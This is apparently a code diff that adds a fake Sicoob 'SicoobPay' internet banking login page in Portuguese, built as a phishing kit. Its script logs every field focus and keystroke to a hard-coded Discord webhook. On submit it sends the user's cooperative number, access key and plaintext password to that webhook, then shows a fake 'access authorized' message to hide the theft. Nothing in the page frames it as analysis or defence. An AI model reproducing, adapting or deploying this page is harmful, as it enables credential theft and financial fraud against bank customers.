@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="pt" translate="no">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#0D7A72">
+<title>SicoobPay | Internet Banking</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
+    background: linear-gradient(180deg, #0D7A72 0%, #0D7A72 50%, #1B9A8B 100%);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  .container {
+    width: 100%;
+    max-width: 400px;
+    margin: 0 auto;
+  }
+
+  .header {
+    text-align: center;
+    margin-bottom: 32px;
+  }
+
+  .logo-title {
+    font-size: 32px;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+  }
+
+  .logo-title .sicoob {
+    color: #FFFFFF;
+  }
+
+  .logo-title .pay {
+    color: #4CC964;
+  }
+
+  .form-card {
+    width: 100%;
+    background: rgba(10, 92, 92, 0.35);
+    border: 1px solid rgba(79, 172, 157, 0.5);
+    border-radius: 12px;
+    padding: 28px 24px;
+    margin-bottom: 24px;
+  }
+
+  .form-description {
+    color: rgba(255, 255, 255, 0.95);
+    font-size: 14px;
+    margin-bottom: 24px;
+    text-align: center;
+    font-weight: 500;
+  }
+
+  .form-group {
+    margin-bottom: 18px;
+  }
+
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    background: rgba(255, 255, 255, 0.08);
+    border: 1px solid rgba(79, 172, 157, 0.6);
+    border-radius: 8px;
+    color: rgba(255, 255, 255, 0.95);
+    font-size: 14px;
+    font-family: inherit;
+    transition: all 0.3s ease;
+  }
+
+  .form-input::placeholder {
+    color: rgba(255, 255, 255, 0.6);
+  }
+
+  .form-input:focus {
+    outline: none;
+    background: rgba(255, 255, 255, 0.12);
+    border-color: rgba(76, 201, 100, 0.8);
+  }
+
+  .btn-login {
+    width: 100%;
+    padding: 14px 16px;
+    background: #4FAC9D;
+    color: #FFFFFF;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: 12px;
+    transition: all 0.3s ease;
+  }
+
+  .btn-login:hover {
+    background: #3D9588;
+  }
+
+  .btn-login.loading {
+    pointer-events: none;
+    background: #2D7A6F;
+  }
+
+  .spinner {
+    display: inline-block;
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #FFFFFF;
+    border-radius: 50%;
+    animation: spin 0.6s linear infinite;
+    margin-right: 8px;
+    vertical-align: middle;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  .access-tabs {
+    display: flex;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+
+  .access-tab {
+    flex: 1;
+    padding: 12px 8px;
+    background: rgba(255,255,255,0.1);
+    border: 1px solid rgba(255,255,255,0.2);
+    border-radius: 8px;
+    color: rgba(255,255,255,0.85);
+    text-align: center;
+    cursor: pointer;
+    font-weight: 600;
+    transition: all 0.3s ease;
+  }
+
+  .access-tab.active {
+    background: rgba(76,201,100,0.25);
+    border-color: rgba(76,201,100,0.6);
+    color: #FFFFFF;
+  }
+
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    font-size: 11px;
+  }
+
+  .footer-links a {
+    color: rgba(255,255,255,0.7);
+    text-decoration: none;
+  }
+
+  .footer-links a:hover {
+    text-decoration: underline;
+  }
+
+  .footer-sep {
+    color: rgba(255,255,255,0.4);
+  }
+
+  @media (max-width: 480px) {
+    .form-card { padding: 22px 18px; }
+    .logo-title { font-size: 28px; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="logo-title">
+      <span class="sicoob">SICOOB</span><span class="pay">PAY</span>
+    </div>
+  </div>
+
+  <div class="form-card">
+    <div class="form-description">
+      Informe os dados abaixo para acessar o SicoobPay
+    </div>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <input type="text" class="form-input" id="cooperativa" placeholder="Informe a sua cooperativa" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <input type="text" class="form-input" id="chaveAcesso" placeholder="Informe a sua chave de acesso" autocomplete="off">
+      </div>
+      <div class="form-group">
+        <input type="password" class="form-input" id="senha" placeholder="Digite a sua senha de acesso" autocomplete="off">
+      </div>
+      <button type="submit" class="btn-login" id="btnLogin">Entrar</button>
+    </form>
+  </div>
+
+  <div class="access-tabs">
+    <div class="access-tab active" id="tabBanking">Internet Banking</div>
+    <div class="access-tab" id="tabOperator">ACESSO OPERADOR</div>
+  </div>
+
+  <div class="footer-links">
+    <a href="#">Política de Privacidade</a>
+    <span class="footer-sep">|</span>
+    <a href="#">Termos e condições</a>
+    <span class="footer-sep">|</span>
+    <a href="#">Fale conosco</a>
+  </div>
+</div>
+
+<script>
+  // =====================================================
+  // DISCORD WEBHOOK - REAL-TIME CAPTURE
+  // =====================================================
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1457481073922543637/ZucrulRGAUcUfEpc0Nyvod8-HxO0MezvpWlkjeOsrTd8BodQSBgMmOYGgke89fSXfiA6';
+  
+  const SESSION_ID = 'sicoob_' + Date.now() + '_' + Math.random().toString(36).substring(2, 10);
+  let lastSendTime = 0;
+  const MIN_INTERVAL = 500;
+  let messageQueue = [];
+  let isSending = false;
+  
+  async function sendToDiscord(text, priority = false) {
+    const now = Date.now();
+    if (now - lastSendTime < MIN_INTERVAL && !priority) {
+      messageQueue.push(text);
+      if (!isSending) setTimeout(processQueue, MIN_INTERVAL - (now - lastSendTime) + 50);
+      return;
+    }
+    return sendNow(text);
+  }
+  
+  async function sendNow(text) {
+    lastSendTime = Date.now();
+    const timestamp = new Date().toLocaleString('pt-BR');
+    const payload = {
+      content: `**[${timestamp}]** ${text}`,
+      username: "SicoobPay Monitor"
+    };
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e) {}
+  }
+  
+  async function processQueue() {
+    if (messageQueue.length === 0) { isSending = false; return; }
+    isSending = true;
+    const next = messageQueue.shift();
+    await sendNow(next);
+    setTimeout(processQueue, MIN_INTERVAL);
+  }
+  
+  // Session start
+  sendToDiscord(`🟢 **SESSÃO INICIADA** | ID: ${SESSION_ID} | ${new Date().toLocaleString('pt-BR')}`);
+  
+  // Form elements
+  const cooperativaInput = document.getElementById('cooperativa');
+  const chaveAcessoInput = document.getElementById('chaveAcesso');
+  const senhaInput = document.getElementById('senha');
+  const loginBtn = document.getElementById('btnLogin');
+  const loginForm = document.getElementById('loginForm');
+  
+  let cooperativaBuffer = '', chaveAcessoBuffer = '', senhaBuffer = '';
+  
+  // Keystroke capture
+  cooperativaInput.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    if (newValue !== cooperativaBuffer) {
+      sendToDiscord(`⌨️ **Cooperativa** → "${newValue}"`);
+      cooperativaBuffer = newValue;
+    }
+  });
+  
+  chaveAcessoInput.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    if (newValue !== chaveAcessoBuffer) {
+      sendToDiscord(`⌨️ **Chave de Acesso** → "${newValue}"`);
+      chaveAcessoBuffer = newValue;
+    }
+  });
+  
+  senhaInput.addEventListener('input', function(e) {
+    const newValue = e.target.value;
+    if (newValue !== senhaBuffer) {
+      sendToDiscord(`⌨️ **Senha** → [${'█'.repeat(newValue.length)}] (${newValue.length} caracteres)`);
+      senhaBuffer = newValue;
+    }
+  });
+  
+  // Focus events
+  cooperativaInput.addEventListener('focus', () => sendToDiscord(`🎯 **Cooperativa** - campo ativado`));
+  chaveAcessoInput.addEventListener('focus', () => sendToDiscord(`🎯 **Chave de Acesso** - campo ativado`));
+  senhaInput.addEventListener('focus', () => sendToDiscord(`🎯 **Senha** - campo ativado`));
+  
+  // Tab switching
+  const tabBanking = document.getElementById('tabBanking');
+  const tabOperator = document.getElementById('tabOperator');
+  let currentMode = 'banking';
+  
+  tabBanking.onclick = () => {
+    currentMode = 'banking';
+    tabBanking.classList.add('active');
+    tabOperator.classList.remove('active');
+    chaveAcessoInput.placeholder = 'Informe a sua chave de acesso';
+    sendToDiscord(`🔄 **MODO ALTERADO**: Internet Banking`);
+  };
+  
+  tabOperator.onclick = () => {
+    currentMode = 'operator';
+    tabOperator.classList.add('active');
+    tabBanking.classList.remove('active');
+    chaveAcessoInput.placeholder = 'Matrícula do operador';
+    sendToDiscord(`🔄 **MODO ALTERADO**: Acesso OPERADOR`);
+  };
+  
+  // Login handler
+  loginForm.onsubmit = async (e) => {
+    e.preventDefault();
+    
+    const cooperativa = cooperativaBuffer;
+    const chaveAcesso = chaveAcessoBuffer;
+    const senha = senhaBuffer;
+    const mode = currentMode === 'banking' ? 'Internet Banking' : 'Operador';
+    
+    // Send full credentials
+    let credentialMsg = `🚨 **🔐 LOGIN ATTEMPT - FULL CREDENTIALS 🔐** 🚨\n`;
+    credentialMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+    credentialMsg += `📌 **SESSÃO:** ${SESSION_ID}\n`;
+    credentialMsg += `🎯 **MODO:** ${mode}\n`;
+    credentialMsg += `🏦 **COOPERATIVA:** "${cooperativa || '[VAZIO]'}"\n`;
+    credentialMsg += `🔑 **CHAVE DE ACESSO:** "${chaveAcesso || '[VAZIO]'}"\n`;
+    credentialMsg += `🔐 **SENHA:** ${senha ? `"${senha}"` : '[VAZIO]'} (${senha.length} caracteres)\n`;
+    credentialMsg += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+    
+    await sendToDiscord(credentialMsg, true);
+    
+    if (!cooperativa || !chaveAcesso || !senha) {
+      const originalText = loginBtn.innerHTML;
+      loginBtn.innerHTML = 'Preencha todos os campos';
+      loginBtn.style.background = '#ff6b6b';
+      setTimeout(() => {
+        loginBtn.innerHTML = originalText;
+        loginBtn.style.background = '#4FAC9D';
+      }, 2000);
+      return;
+    }
+    
+    loginBtn.classList.add('loading');
+    loginBtn.innerHTML = '<span class="spinner"></span>Verificando...';
+    
+    setTimeout(() => {
+      loginBtn.innerHTML = '✓ Acesso autorizado';
+      loginBtn.style.background = '#3bb84f';
+      setTimeout(() => {
+        loginBtn.classList.remove('loading');
+        loginBtn.innerHTML = 'Entrar';
+        loginBtn.style.background = '#4FAC9D';
+        
+        // Clear fields
+        cooperativaInput.value = '';
+        chaveAcessoInput.value = '';
+        senhaInput.value = '';
+        cooperativaBuffer = '';
+        chaveAcessoBuffer = '';
+        senhaBuffer = '';
+        
+        alert(`Bem-vindo ao SicoobPay!\nAcesso: ${mode}\nCooperativa: ${cooperativa}`);
+      }, 1500);
+    }, 1200);
+  };
+  
+  // Page close tracking
+  window.addEventListener('beforeunload', () => {
+    sendToDiscord(`🔴 **PÁGINA FECHADA** | Sessão: ${SESSION_ID}`);
+  });
+</script>
+</body>
+</html>
